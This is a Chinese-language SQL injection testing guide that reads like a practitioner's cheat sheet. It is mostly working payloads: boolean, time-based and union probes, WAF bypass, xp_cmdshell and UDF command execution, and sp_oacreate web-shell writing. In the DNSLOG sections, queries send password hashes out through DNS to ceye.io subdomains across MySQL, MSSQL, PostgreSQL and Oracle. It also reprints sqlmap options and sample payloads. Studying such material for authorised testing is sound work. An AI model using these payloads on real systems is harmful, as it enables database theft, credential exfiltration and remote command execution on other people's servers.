# SQL Injection 测试思路与用例

## 基本思路

### 寻找注入点

可以关注一下地方：
- 搜索框
- 注册框
- 登录框
- 排序
- 动态图表
- 日期查询
- 语种选择

#### 搜索框

搜索框可能用到语句有：

```SELECT p.*, pac.all_cities FROM {p}_page AS p left join {p}_page_all_cities pac on p.page_id=pac.page_id and p.lang=pac.lang left join {p}_page_all_provinces pap  on p.page_id=pap.page_id and p.lang=pap.lang WHERE p.[lang] = N'2' AND p.[hidden] = N'0' AND p.[parent_id] =14  And ( p.[title] like N'%sql%' )  And (p.[pri4]=N'1' Or p.[pri5]=N'1' Or p.[pri6]=N'1' Or p.[sec1]=N'1' Or p.[sec2]=N'1' Or p.[sec3]=N'1' Or p.[sec4]=N'1' Or p.[sec5]=N'1' Or p.[sec6]=N'1')  And ( wholeyear=N'1'  Or year1m9=N'1' Or  wholeyear=N'1'  Or year2m1=N'1')  ORDER BY  wholeyear```

上面用到了预编译，有些程序员会毫无安全意识的不使用，使用字符串硬连接，这时就会有注入形成。

> 预编译SQL语句就是将这类语句中的值用“占位符”替代，可以视为将sql语句模板化或者说参数化。一次编译、多次运行，省去了解析优化等过程。DBMS可以将一些常用的预编译语句缓存起来，更好的优化查询。预编译通过 PreparedStatement 和 占位符 实现。使用预编译，SQL注入的参数将不会再进行SQL编译，即 or, and 等关键字不被认为是 SQL语法。上例中“{ }”,就是参数传入位置。


#### 排序功能（get或post排序参数）注入点

排序可能使用了sql的```order by``` 或是 ```sort```,这也是一个常见的可注入点。而且 order by 后语句不能参数化，有利于注入。


#### 日期型参数注入点

例如有下列语句：
```SELECT * FROM `wp_posts` where post_content like '%%' and post_date BETWEEN '2020/01/01' and '2020/09/02'```

日期类型如果在接受参数的时候没有进行强制类型转换很容易出现注入问题，也是直接拼接的原因。

#### 语种选择

即出现```lang=cn``` 或 ```language=en```的地方。

#### 其他常见输入处或隐藏输入处

- login
- register
- forgot password
- remember me

### 尝试是否可注入

使用下列进行初步尝试，页面不报错或有不同反馈都可能预示着注入的可能。
- ```1 or 1=1```
- ```1' or '1'='1```
- ```1" or "1"="1```
- ```" or 1=1 or  version() "``` 
- ```" and ord(mid(version(),1,1))>51)"``` 返回正常（没变化）说明是4.0以上版本，可以用union查询。
- `1 and substring(@@version,1,1)=5` 返回正常，说明是5.x版本。结果居然报“Sorry the solution is not correct, please try again.” 这应该是语句含有不支持的函数VERSION()，那么后台可能不是mysql。

### 判断数据库类型
猜测是否有可用的函数，如：
- database()
- database_name()

例如：猜一下，是不是还有个函数叫database_name(),测试 ```tom' and  SUBSTRING(database_name(),1,1)='a'     ;--``` 查看页面结果或响应状态。

构造一个fuzz：```tom'\+and\+SUBSTRING\(database_name\(\),[0-9],1\)='\w'\+;--```，查看响应中含有“...already exists please try to register with a different username.”，发现数据库名为“HSQLDB” ,是Java内置的数据库。



### 猜测用户名

- 判断第一个用户名的首字符是否为字母（ascii('A')=65）？ 
  - `1' and ascii(substring((select concat(username,0x3a,passwd) from users limit 0,1),1,1)) >64`
- 判断第一个用户名的首字符是否为小写字母（ascii('a')=97）？ 
  - `1' and ascii(substring((select concat(username,0x3a,passwd) from users limit 0,1),1,1)) >96`
- 判断第一个用户名的首字符是否为a-m的小写字母（ascii('n')=110）？ 
  - `1' and ascii(substring((select concat(username,0x3a,passwd) from users limit 0,1),1,1)) < 110` 
- ...

### 尝试特殊字符是否可用


- ```/* */```，行内注释
- ```--```，行注释
- ```#```，行注释
- ```;``` 语句分隔符，可用于构建查询链
- ```'```，单引号，用于包含字符串
- ```+```, 加号用于连接字符串
- ```||```, 用于连接字符串
- ```Char()```， 转化为字符串函数

### 尝试不同编码

历史上，曾经出现过基于字符集的注入技巧。

开发人员常会转义单引号、双引号等特殊字符。但如果数据库采用了宽字符集，可能会有一些字符解析漏洞存在。这是因为web中没有考虑双字节字符的问题，双字节字符可能被web认为是两个字节。

例如：php中的addslashes()函数会转义单引号、双引号、NULL和`\`，或当maigc_quotes_gpc开启时，会在特殊符号前加转义字符“\”

例如：mysql使用GBK编码时，`0xbf27` 和 `0xbf5c`被认为是相同的字符

#### 防护方法
- 在软件系统各层面统一编码，建议使用utf-8
- html `<meta charset='utf-8'>`，确定设置当前页面字符集。

### 尝试特殊语句

#### union
union语句用来将两个或多个select语句的结果结合起来。即对结果做并操作。

注意，使用union时：
- 各个查询语句的结果中，列的数量必须相同；
- 后续union查询语句各列的数据类型，必须与第一个select语句的各列数据类型相一致。
- 上述要求对所有列有效。

```select first_name from user_system_data union select login_count from user_data;```

union所有的语法也允许重复值。


#### joins

join运算用于基于一个关联的列，来连接（组合）两个或多个表。

```select * from user_data INNER JOIN user_data_tan ON user_data.userid=user_data_tan.userid;```


### 尝试盲注

盲注就是通过询问数据库真或假问题，基于应用响应判断答案是真是假的方法。这种方法常用于那些使用通用错误提示的web系统是否有sql注入漏洞，并对有问题的加以利用。

### 基于内容的注入

例如有url``` https://my-shop.com?article=4```是可得到200响应的, 其中的article=4可能是一个sql查询条件，那么我们可以构造一个url，进行测试：```https://my-shop.com?article=4 and 1=1```

- 如果两个url产生的浏览器返回结果相同，那么就可以初步确定有盲注漏洞。

- 如果产生了“page not found”响应，那么可能是盲注方法不对，可以尝试```https://my-shop.com?article=4 and 1=2```,这时没任何响应说明存在盲注，因为语句可被接受，且因条件为假未返回结果。

在确定有盲注可能性之后，构造复杂的语句，猜测信息，例如：

- 猜测数据库版本：```https://my-shop.com?article=4 AND substring(database_version(),1,1) = 2``` 


### 基于时间的注入

与上面不同的是，服务器对于提交的测试sql不会有明确的有区别的响应，那么我们可以根据不同语句的执行响应时间来进行判断。

比较简单的办法是：```sleep()```函数的使用。

例如：```https://my-shop.com?article=4 ; sleep(4)```


## 自定义函数 UDF

不少数据库都支持从本地文件系统中导入一个共享文件作为自定义函数。自定义函数可能调用系统命令，完成系统渗透。

例如：mysql 4.x 的UDF的语法如下：

`CREATE FUNCTION foo_name RETURNS INTEGER SONAME shared_library`

在 mysql 5.x后，上述定义不再适用。但可通过 lib_mysqludf_sys 提供的几个函数执行系统命令，最主要的是：
- `sys_eval()` 执行任意系统命令，返回输出
- `sys_exec()` 执行任意命令，将退出码返回
- `sys_get()` 获取一个环境变量
- `sys_set()` 设置一个环境变量

将 lib_mysqludf_sys 上传到数据库能访问的路径下，创建UDF后就可以使用上述命令了。

sqlmap已经集成了这一功能，例如sqlmap执行linux命令`id`：
`python sqlmap.py -u "http://target-ip/injectable_path?id=1" --os-cmd id -v 1`

UDF不仅是MYSQL的特性，其他数据库也有类似功能：
- ms sql server，可以直接使用存储过程`xp_cmdshell`执行系统命令
- oracle 中，如果服务器有java环境，那么也可能造成命令执行，即注入后可多语句执行的情况下，可以在oracle中创建java的存储过程，执行系统命令。

## 曾经出现过的 sql column truncation
基本思路是插入过长的数值时，可能会被截断，例如插入users表用户名`admin    很长的空格     x`，一些数据库产品会截断这个输入，并且插入执行成功。这样数据库中可能就存在2个admin了。


## 攻击存储过程
仅当存储过程不能生成动态sql时，才可以使用存储过程避免注入问题。


### 存储过程
在ms sql server 和oracle中有大量内置的存储过程，他们与UDF很像，但必须使用 `CALL` 或 `EXECUTE` 执行。

#### ms sql server

#####  xp_cmdshell
微软的sql server 中，存储过程 `xp_cmdshell`可谓是臭名昭著，黑客教程总会讲到注入sql server时使用其执行系统命令：
- `EXEC master.dbo.xp_cmdshell 'cmd.exe dir c:\'`
- `EXEC master.dbo.xp_cmdshell 'ping'`

存储过程 `xp_cmdshell` 在sqlserver 2000默认开启，在 2005后被默认关闭了。但sqlserver2005\2008中, 如果当前数据库用户有 sysadmin 权限，则可以使用 `sp_configure` 重新开启它。如果在sqlserver 2000被关闭，则可以使用sp_addextendproc开启它。

例如：
```
EXEC sp_configure 'show advanced options' , 1
RECONFIGURE

EXEC sp_configure 'xp_cmdshell', 1
RECONFIGURE
```

##### 其他可用的存储过程
- `xp_regread` 操作注册表
- xp_regaddmultistring
- xp_regdeletekey
- xp_regdeletekey
- xp_regenumkeys
- xp_regenumvalues
- xp_regread
- xp_regremovemultistring
- xp_regwrite
- xp_servicecontrol ,允许用户启动，停止服务
- xp_availablemedia，显示机器上有用的驱动器
- xp_dirtree，允许获得一个目录树
- xp_enumdsn，列举服务器上的odbc数据源
- xp_loginconfig，获取服务器安全信息
- xp_makecab，允许用户在服务器上创建一个压缩文件
- xp_ntsec_enumdomains，列举服务器可以进入的域
- xp_terminate_process，提供进程id，终止此进程

例如:
```
EXEC xp_regread HKEY_LOCAL_MACHINE,'SYSTEM\CurrentControlSet\Services\lanmanserver\parameters','nullsessionshares'

EXEC xp_regnumvalues HKEY_LOCAL_MACHINE,'SYSTEM\CurrentControlSet\Services\snmp\parameters\validcommunities'

EXEC master..xp_serviccontrol 'start' , 'schedule'
```
##### 存储过程本身的注入漏洞

可注入的存储过程举例(Microsoft SQL Server):
```sql
CREATE PROEDURE getUser(@lastName nvarchar(25))
AS
declare @sql nvarchar(255)
set @sql = 'select * from users where
            LastName = + @LastName + '
exec sp_executesql @sql
```
上面的@sql是一个动态的sql语句，可以被替换为注入内容。

安全的存储过程例如(Microsoft SQL Server)：
```sql
CREATE PROCEDURE ListCustomers(@Country nvarchar(30))
AS
SELECT City, COUNT(*)
FROM Customers
WHERE Country LIKE @Country GROUP BY City

EXEC ListCustomers ‘USA’
```



## 绕过WAF

在这里，需要清楚WAF拦截的是payload的哪一部分。

### 采取分段测试的方法确定拦截策略

例如：假设无法执行```select user()``` ，我们需要判断WAF匹配规则，是命中了```select```，还是```user()```，或是使用了 ```/select.*?user/```这个正则。

- 尝试1：```selact user()```，测试是否拦截 select
- 尝试2：```select usar()```，测试是否拦截 user

若上述两个测试都为拦截，则说明使用了 ```/select.*?user/```这个正则匹配，那么我们修改语句即可。

### 使用数据库特性和中间件解析特性绕过内敛注释符

作者：二向箔安全学院
链接：https://www.zhihu.com/question/404381236/answer/1318383402
来源：知乎
著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。

MySQL Server支持C样式注释的某些变体。这些使您能够通过使用以下形式的注释来编写包括MySQL扩展但仍可移植的代码：
/*! MySQL-specific code */
在这种情况下，MySQL服务器将像其他任何SQL语句一样解析并执行注释中的代码，但是其他SQL Server将忽略这些扩展。例如，MySQL服务器可以STRAIGHT_JOIN在以下语句中识别关键字，而其他服务器则不能：
SELECT /*! STRAIGHT_JOIN */ col1 FROM table1,table2 WHERE ...
如果在! 字符后添加版本号，则仅当MySQL版本大于或等于指定的版本号时，才会执行注释中的语法。KEY_BLOCK_SIZE以下注释中的关键字仅由MySQL 5.1.10或更高版本的服务器执行：
CREATE TABLE t1(a INT, KEY (a)) /*!50110 KEY_BLOCK_SIZE=1024 */;
刚刚描述的注释语法适用于mysqld服务器如何 解析SQL语句。在 MySQL的客户端程序将它们发送到服务器之前还执行语句的一些分析。（这样做是为了确定多语句输入行中的语句边界。）有关服务器和mysql客户端解析器之间差异的信息 ，请参见 第4.5.1.6节“ mysql客户端技巧”。
/*!12345 ... */格式的 注释未存储在服务器上。如果此格式用于注释存储的程序，则注释不会保留在程序主体中。
C样式注释语法的另一种变体用于指定优化器提示。提示注释+ 在/*注释打开顺序之后包含一个字符。例：
SELECT /*+ BKA(t1) */ FROM ... ;


### 参考
https://github.com/aleenzz/MYSQL_SQL_BYPASS_WIKI


## 快速定位重要的数据表

大型数据库中有上百个表，如何快速定位？

使用sqlmap中的 ```--search```参数，可以用来搜索列、表、数据库名称。

使用方法：
- ```--search -D:数据库名```
- ```--search -T:表名```
- ```--search -C:字段名```

例如搜索字段：username，password等。

## 脱库

一般方式是脱出数据文件，例如：mysql自带的mysqldump就可以用来获取文件。

如果是站库分离的系统，可以上传 mysqldump，指定参数```-h```的主机地址也可以实现数据库文件。

mssql可以获取mdf文件或使用osql命令。

## 注入读写文件

>以下需要事先获得可读写的远程主机路径

当我们注入不能获得进一步内容时，可以考虑读写文件。

读写文件很多情况下都需要用到堆叠语句，MySQL中如果用的是mysqli。并不是所有情况都支持堆叠语句，例如：
- 部分 pdo处理可以堆叠；
- mssql + aspx 是原生堆叠；
- Oracle 是否支持堆叠，依赖于代码层面的实现。


MySQL读文件值得一提的就是load data infile和load data local infile，不受secure-file-priv的限制，但是需要堆叠，或者你也可以找找phpmyadmin，phpmyadmin的话还受到open_basedir限制。通过注入拓展任意文件读取，也算一种思路吧。如果你是mysql低权限账户可以试着读一下user.MYD，万一读到root密码呢？
至于load data local infile的权限问题一直是一个谜，我理解的他的权限应该是和MySQL的权限一样的，因为碰到了一次读不到apache用户www目录下的源码，MySQL用户和apache权限不一样。但是其实我自己都不是很确定，希望有师傅看到了指点一下。
MySQL写文件的话into outfile、into dumpfile还有就是日志写文件general log，绝对路径写shell，插件写udf，写mof。
mssql的话读写文件的操作更多样化一些。

列目录```xp_dirtree```、```xp_subdirs```

写文件```xp_cmdshell 'echo 1 > c:/1.txt'```、```sp_oacreate```、```sp_oamethod``` 配合写shell

```
declare @sp_passwordxieo int, @f int, @t int, @ret int;
exec sp_oacreate 'scripting.filesystemobject', @sp_passwordxieo out;
exec sp_oamethod @sp_passwordxieo, 'createtextfile', @f out, 'c:/www/1.aspx', 1;
exec @ret = sp_oamethod @f, 'writeline', NULL,'this is shell';
```

或者出网的话直接写一个vbs下载器，随意发挥。

读文件的话
```
USE test;
DROP TABLE cmd;
CREATE TABLE cmd ( a text );
BULK INSERT cmd FROM 'd:/config.aspx' WITH (FIELDTERMINATOR = 'n',ROWTERMINATOR = 'nn')
SELECT  * FROM  cmd
```

站库分离的话看下数据库服务器有没有web服务，如果直接访问IP是iis默认页面可以直接往iis的默认目录写aspx。没有web服务的话可以写一个dns的马进去，xp_cmdshell执行，或者调用wscript.shell执行。

postgresql的copy from，copy to读写文件，要是有别人的马直接读文件岂不是美滋滋。

## 执行命令

MySQL udf mof不说了
mssql xp_cmdshell、自己创建clr、调用wscript.shell、调用Shell.Application、写启动项、写dll劫持。
之前碰到过一个站库分离，有xp_cmdshell，但是只出dns的。通过certutil转exe为base64，通过echo写入文件，调用目标的certutil转回exe执行上线。

##    其他利用场景
任意文件上传，没有路径，找找注入在数据库中肯定存储了文件的路径，配合sqlmap的--sql-shell和--search参数就能找到shell地址。



## 参考：
- https://mp.weixin.qq.com/s?__biz=MzAxNDM3NTM0NQ==&mid=2657039441&idx=2&sn=6c7943ba7d78b05557ef03b5875ed1ec&chksm=803fd48fb7485d99d19b3945d9142c35aeb8344e156984c8dfc048a93793dd08e0c5473b795e&mpshare=1&scene=24&srcid=10234Y11mGORCKoTcjBRm3tl&sharer_sharetime=1603450492711&sharer_shareid=9530e1864f9ccae4832cd88b98041964&exportkey=AUwX7JFVpmgH2m9uJC%2FVNrw%3D&pass_ticket=nQcihpZIrgq%2F0dgwRHBaNkcP2TMN7UhBJZ%2BftGUPWoYWtdYy24W%2FTS9YUwwG9Jh%2B&wx_header=0#rd
- https://mp.weixin.qq.com/s?__biz=MzA5ODA0NDE2MA==&mid=2649733472&idx=1&sn=80a329001a5a121a39a574b9be6b38b9&chksm=888c890fbffb0019a72cdfb85c5530381584069f09a17aedc677882441b784cc1c4b4443dedd&mpshare=1&scene=24&srcid=1023fVE1sphfNxZcBuieFmdH&sharer_sharetime=1603447869255&sharer_shareid=9530e1864f9ccae4832cd88b98041964&exportkey=Adrfgb9TOQsqv3gkdAmJgWc%3D&pass_ticket=nQcihpZIrgq%2F0dgwRHBaNkcP2TMN7UhBJZ%2BftGUPWoYWtdYy24W%2FTS9YUwwG9Jh%2B&wx_header=0#rd

- https://mp.weixin.qq.com/s?__biz=MzAxNDM3NTM0NQ==&mid=2657039246&idx=2&sn=148c9c465263ad54b3b422387de2e49a&chksm=803fd350b7485a46ba70d7b1bafcb41aa481a5021ed173d003f4602b8e6e15dd1fd31a2e1328&mpshare=1&scene=24&srcid=0823whOFHmPKZ1XXZtdBiI0S&sharer_sharetime=1598195216665&sharer_shareid=9530e1864f9ccae4832cd88b98041964&exportkey=AW7osLi7uj1oQBstdrRrOdg%3D&pass_ticket=nQcihpZIrgq%2F0dgwRHBaNkcP2TMN7UhBJZ%2BftGUPWoYWtdYy24W%2FTS9YUwwG9Jh%2B&wx_header=0#rd

- https://mp.weixin.qq.com/s?__biz=MzAwMjA5OTY5Ng==&mid=2247487719&idx=1&sn=7fac52127b489989c67f9b0b5d9d1824&chksm=9acec078adb9496e33675e1d7b673855a280d6c59c9fee915452ad27ad6f9c56e076fa60df9a&mpshare=1&scene=24&srcid=0810R1EssvjvmoM6q13lR46w&sharer_sharetime=1597026200547&sharer_shareid=9530e1864f9ccae4832cd88b98041964&exportkey=AbD7Wr1WHoqi2jijk53XIMU%3D&pass_ticket=nQcihpZIrgq%2F0dgwRHBaNkcP2TMN7UhBJZ%2BftGUPWoYWtdYy24W%2FTS9YUwwG9Jh%2B&wx_header=0#rd

- https://github.com/aleenzz/MYSQL_SQL_BYPASS_WIKI


## sqlmap 工具

```
leo@kali:~$ sqlmap --help
        ___
       __H__
 ___ ___[.]_____ ___ ___  {1.4.10.22#dev}
|_ -| . [,]     | .'| . |
|___|_  [']_|_|_|__,|  _|
      |_|V...       |_|   http://sqlmap.org

Usage: python sqlmap [options]

Options:
  -h, --help            Show basic help message and exit
  -hh                   Show advanced help message and exit
  --version             Show program's version number and exit
  -v VERBOSE            Verbosity level: 0-6 (default 1)

  Target:
    At least one of these options has to be provided to define the
    target(s)

    -u URL, --url=URL   Target URL (e.g. "http://www.site.com/vuln.php?id=1")
    -g GOOGLEDORK       Process Google dork results as target URLs

  Request:
    These options can be used to specify how to connect to the target URL

    --data=DATA         Data string to be sent through POST (e.g. "id=1")
    --cookie=COOKIE     HTTP Cookie header value (e.g. "PHPSESSID=a8d127e..")
    --random-agent      Use randomly selected HTTP User-Agent header value
    --proxy=PROXY       Use a proxy to connect to the target URL
    --tor               Use Tor anonymity network
    --check-tor         Check to see if Tor is used properly

  Injection:
    These options can be used to specify which parameters to test for,
    provide custom injection payloads and optional tampering scripts

    -p TESTPARAMETER    Testable parameter(s)
    --dbms=DBMS         Force back-end DBMS to provided value

  Detection:
    These options can be used to customize the detection phase

    --level=LEVEL       Level of tests to perform (1-5, default 1)
    --risk=RISK         Risk of tests to perform (1-3, default 1)

  Techniques:
    These options can be used to tweak testing of specific SQL injection
    techniques

    --technique=TECH..  SQL injection techniques to use (default "BEUSTQ")

  Enumeration:
    These options can be used to enumerate the back-end database
    management system information, structure and data contained in the
    tables

    -a, --all           Retrieve everything
    -b, --banner        Retrieve DBMS banner
    --current-user      Retrieve DBMS current user
    --current-db        Retrieve DBMS current database
    --passwords         Enumerate DBMS users password hashes
    --tables            Enumerate DBMS database tables
    --columns           Enumerate DBMS database table columns
    --schema            Enumerate DBMS schema
    --dump              Dump DBMS database table entries
    --dump-all          Dump all DBMS databases tables entries
    -D DB               DBMS database to enumerate
    -T TBL              DBMS database table(s) to enumerate
    -C COL              DBMS database table column(s) to enumerate

  Operating system access:
    These options can be used to access the back-end database management
    system underlying operating system

    --os-shell          Prompt for an interactive operating system shell
    --os-pwn            Prompt for an OOB shell, Meterpreter or VNC

  General:
    These options can be used to set some general working parameters

    --batch             Never ask for user input, use the default behavior
    --flush-session     Flush session files for current target

  Miscellaneous:
    These options do not fit into any other category

    --sqlmap-shell      Prompt for an interactive sqlmap shell
    --wizard            Simple wizard interface for beginner users

```

参数 --technique 用于指定检测注入时所用技术。默认情况下 Sqlmap 会使用自己支持的全部技术进行检测。 此参数后跟表示检测技术的大写字母，其值为 B、E、U、S、T 或 Q，含义如下：

- B：Boolean-based blind（布尔型注入）
- E：Error-based（报错型注入）
- U：Union query-based（可联合查询注入）
- S：Stacked queries（可多语句查询注入）
- T：Time-based blind（基于时间延迟注入）
- Q：Inline queries（嵌套查询注入）


可以用 "--technique ES" 来指定使用两种检测技术。"--technique BEUSTQ" 与默认情况等效。

`$ python sqlmap.py -u "http://127.0.0.1/sqli/Less-1/?id=1" --technique EB --banner`

用 --time-sec 3 参数设置基于时间延迟注入中延时时长，默认为 5 秒

在进行联合查询注入时，Sqlmap 会自动检测列数，范围是 1 到 10。当 level 值较高时列数检测范 围的上限会扩大到 50。

可以用此参数指定列数检测范围，如 --union-cols 12-16 就会让 Sqlmap 的列数检测范围变成 12 到 16。

默认情况下 Sqlmap 进行联合查询注入时使用空字符（NULL）。但当 level 值较高时 Sqlmap 会生成随机数用于联合查询注入。 因为有时使用空字符注入会失败而使用随机数会成功。但是，注入时过多使用空字符（NULL）会使注入失败率增高。因此可以结合 --union-char 替换null的字符串 参数改善。

`$ python sqlmap.py -u "http://127.0.0.1/sqli/Less-4/" --union-cols 12-16 --union-char 666 -v 3 --banner`

有些情况下在联合查询中必须指定一个有效和可访问的表名，否则联合查询会执行失败。参数 --union-from 表名

`$ python sqlmap.py -u "http://127.0.0.1/sqli/Less-4/" --union-cols 12-16 --union-char 666 --union-from hello -v 3 --banner`


探测目标指纹信息，参数 -f 或者 --fingerprint，它的效果与 --banner 相似。

`$ python sqlmap.py -u "http://127.0.0.1/sqli/Less-3/?id=1" -f`


## sqlmap的一些payload
假设 Parameter: id (GET)

- Type: boolean-based blind：

`Payload: id=(SELECT (CASE WHEN (8447=8447) THEN 1 ELSE (SELECT 6925 UNION SELECT 4265) END))`

- Type: error-based: 

`id=1 AND (SELECT 8358 FROM(SELECT COUNT(*),CONCAT(0x716b707071,(SELECT (ELT(8358=8358,1))),0x716b766a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)`

说明：ELT(N,str1,str2,str3,...) ， Returns str1 if N = 1, str2 if N = 2, and so on. Returns NULL if N is less than 1 or greater than the number of arguments. ELT() is the
complement of FIELD().

说明：FLOOR(X) Returns the largest integer value not greater than X.


- Type: time-based blind

`id=1 AND (SELECT 5177 FROM (SELECT(SLEEP(5)))ynSj)`

- Type: UNION query

`id=-5237 UNION ALL SELECT NULL,NULL,CONCAT(0x716b707071,0x7966736e67425968536f6e4e686d55544e654d4d737473774568637945746b77435063674d525141,0x716b766a71),NULL,NULL,NULL,NULL,NULL-- -`


## DNSLOG 应用

dnslog在sql注入中的应用是一种out-band应用，达到旁路查看执行效果的作用。此外在命令注入、ssrf等中也可应用。
### mysql中的情况
必要条件：
- 目标可以访问dnslog网站,（hyuga、CEYE）
- mysql数据库可以调用 load_file()
- 目标平台为windows（因为windows使用UNC路径）
- 反馈内容受DNS查询限制，太长的需要做字符串切割（例如：substring(str,1,10))



mysql服务端的文件读取有很多的条件限制，主要是mysql数据库的配置，为了安全原因，当读取位于服务器上的文本文件时，文件必须处于数据库目录且可被所有人读取。

可以在mysql命令控制台执行`show variables like '%secure%'` 来查看。会列出`secure_auth`和`secure_file_priv` , 然后使用`select @@secure_file_priv`查看内容。


参数是用来限制LOAD DATA,SELECT ... OUTFILE,DUMPFILE和LOAD_FILE()可以操作的文件夹。

`secure-file-priv` 的值可以分为三种情况：
- 值为null，表示显示mysqld不允许导入|导出;
- 值为/tmp/，表示限制mysqld的导入|导出只能发生在/tmp/目录下，此时如果读写发生在其他文件夹中，就会报错;
- 没有具体值，表示不对mysqld的导入|导出做限制。

除此之外，读取或写入文件必须拥有可操作的用户权限否则会报错。ERROR 1045 (28000): Access denied for user

下面使用load_file() 读取本地文件，假设可注入参数为：id。

载荷：`id=1 union select 1,2,load_file(concat('\\\\',(select hex(password) from test.test_user where  user='admin' limit 1),'.mysql.nk40ci.ceye.io\\abc'))`

说明：
- `password`的值会被传到.mysql.nk40ci.ceye.io\\abc。
- 使用hex()目的是减少特殊字符不能被DNS解析等干扰或编码；
- linux下无法用load_file使用dnslog，这是因为windows下使用UNC路径，即windows命名管理，用于指定和映射驱动器。例如 `\\\ss.xx\t\`
- 上面CONCAT函数拼接了4个\ ,转义后就是2个，使用unc路径，最后构造的就是 `\\密码16进制值.mysql.nk40ci.ceye.io\abc`

### mssql

网上流传较广的一个poc：
```
DECLARE @host varchar(1024);

SELECT @host=(SELECT TOP 1master.dbo.fn_varbintohexstr(password_hash)FROM sys.sql_loginsWHERE name='sa')+'.ip.port.b182oj.ceye.io';

EXEC('master..xp_dirtree"\'+@host+'\foobar$"');
```

上面的代码可以在数据库控制台执行，得到sa用户hex编码。

ms sqlserver 中字段名是不能和自定义函数名字冲突的，如果冲突需要[] 将字段用包裹，例如：

`select pass FROM test.dbo.test_user where [USER]='admin'`

这里的user字段正好和系统的user()函数相同，所以字段需要 [ ] 包裹。

此外，在sqlserver中当需要字符串拼接的时候，如果字段的值的长度没有达到表结构字段的长度，就会用空格来填充。例如pass字段设置的长度是50，所但是值实际的长度是8，之所以剩余的长度就用空格填充了。这个时候就用想办法去掉空格，查阅手册可以发现rtrim函数是可以去除右边空格的：
`select ((select rtrim(pass) from test.dbo.test_user where [USER]='admin')+'.xxnk40ci.ceye.io')`

由于域名是不能带有些特殊字符的，所以我们最好能将查询出来的值编码之后再和域名进行拼接，但是在查阅了sqlserver的手册之后，没有发现可以直接对字符类型进行编码的函数，只有将2进制转换成Hex的函数，所以这里我需要先将字符类型强制转换成varbinary二进制类型，然后再将二进制转化成Hex编码之后的字符类型。先转换成二进制,再把二进制转换成字符类型的Hex编码:

`select ((select master.dbo.fn_varbintohexstr(convert(varbinary,rtrim(pass))) from test.dbo.test_user where [USER]='admin')+'.xx.nk40ci.ceye.io')`

完整poc：
```
http://127.0.0.1/mssql.php?id=1;
DECLARE @host varchar(1024);SELECT @host=(SELECT master.dbo.fn_varbintohexstr(convert(varbinary,rtrim(pass))) 
FROM test.dbo.test_user where [USER] = 'admin')%2b'.cece.nk40ci.ceye.io';
EXEC('master..xp_dirtree "\'%2b@host%2b'\foobar$"');
```
此处有个小问题，因为拼接用到了+号，+号在url中如果不url编码到代码层的时候就成空格了，所以我们需要在提交之前对+号url编码为%2b

ms sqlserver的其它函数：
- master..xp_fileexist
- master..xp_subdirs
- OpenRowset() 
- OpenDatasource() 

后面两个是加载远程数据库的函数，需要较高权限，系统默认是关闭的，需要通过sp_configure去配置高级选项开启：

```
exec sp_configure 'show advanced options',1；　　

reconfigure；　　

exec sp_configure 'Ad Hoc Distributed Queries',1；　　

reconfigure；
```

### postgresql

可以编写一个自定义的函数和存储过程，和SQLServer类似.


copy函数的定义
```
COPY tablename [ ( column [, ...] ) ] 
FROM { 'filename' | STDIN } [ WITH ] [ BINARY ] [ OIDS ] [ DELIMITER [ AS ] 'delimiter' 'null string' ] CSV [ QUOTE [ AS ] 'quote' 'escape' ] 
[ FORCE NOT NULL column [, ...] ] 
COPY tablename [ ( column [, ...] ) ] TO { 'filename' | STDOUT } [ WITH ] [ BINARY ] [ OIDS ] [ DELIMITER [ AS ] 'delimiter' 'null string' ] 
CSV [ QUOTE [ AS ] 'quote' 'escape' ] [ FORCE QUOTEcolumn [, ...] ]
```

从定义看出这里是无法嵌套查询，它这里需要直接填入文件名，所以过程就麻烦一点。

这是网上的POC，整体上没有什么问题。
```
DROP TABLE IF EXISTS table_output;
CREATE TABLE table_output(content text);
CREATE OR REPLACE FUNCTION temp_function()RETURNS VOID AS $$DECLARE exec_cmd TEXT;
DECLARE query_result TEXT;BEGINSELECT INTO query_result (SELECT passwdFROM pg_shadow WHERE usename='postgres');
exec_cmd := E'COPY table_output(content)FROM E\'\\\\'||query_result||E'.postgreSQL.nk40ci.ceye.io\\foobar.txt\'';
EXECUTE exec_cmd;END;$$ LANGUAGE plpgSQL SECURITY DEFINER;SELECT temp_function();
```

只是需要对数据处理编一下码，此处会用到encode函数，如下

`encode(pass::bytea,’hex’)`

最后完整的POC如下：

```
http://127.0.0.1/pgSQL.php?id=1;DROP TABLE IF EXISTS table_output;

CREATE TABLE table_output(content text);

CREATE OR REPLACE FUNCTION temp_function() RETURNS VOID AS $$ DECLARE exec_cmd TEXT;

DECLARE query_result TEXT;

BEGIN SELECT INTO query_result (select encode(pass::bytea,'hex') from test_user where id =1);

exec_cmd := E'COPY table_output(content) FROM E\'\\\\\\\\'||query_result||E'.pSQL.3.nk40ci.ceye.io\\\\foobar.txt\'';

   EXECUTE exec_cmd;

END;

$$ LANGUAGE plpgSQL SECURITY DEFINER;

SELECT temp_function();

```

因为这里的copy需要的参数是文件路径，所以这里其实也是利用了UNC路径，因此这个方式也只能在windows下使用

#### db_link扩展

db_link是PostreSQL用来连接其他的数据库的扩展，用法也很简单，而且可以嵌套子查询，那就很方便了
```
dblink('连接串', 'SQL语句')
http://127.0.0.1/pgsql.php?id=1;CREATE EXTENSION dblink; 
SELECT * FROM dblink('host='||(select encode(pass::bytea,'hex') from test_user where id =1)||'.vvv.psql.3.nk40ci.ceye.io user=someuser dbname=somedb', 
'SELECT version()') RETURNS (result TEXT);
```

CREATE EXTENSION dblink; 就是打开这个扩展，因为这个扩展默认是关闭的。

### Oracle
Oracle的利用方式就太多了，因为Oracle能够发起网络请求的模块是很很多的。

列举几个:

- UTL_HTTP.REQUEST
```
select name from test_user where id =1 union SELECT UTL_HTTP.REQUEST((select pass from test_user where id=1)||'.nk40ci.ceye.io') FROM sys.DUAL;

```

- DBMS_LDAP.INIT

```
select name from test_user where id =1 union SELECT DBMS_LDAP.INIT((select pass from test_user where id=1)||'.nk40ci.ceye.io',80) FROM sys.DUAL;
```

- HTTPURITYPE
```
select name from test_user where id =1 union SELECT HTTPURITYPE((select pass from test_user where id=1)||'.xx.nk40ci.ceye.io').GETCLOB() FROM sys.DUAL;
```

- UTL_INADDR.GET_HOST_ADDRESS
```
select name from test_user where id =1 union SELECT UTL_INADDR.GET_HOST_ADDRESS((select pass from test_user where id=1)||'.ddd.nk40ci.ceye.io') FROM sys.DUAL; 
```

tips：oracle是不允许select语句后面没有表的，所以此处可以跟一个伪表dual

- Oracle其他一些能够发起网络请求的模块：
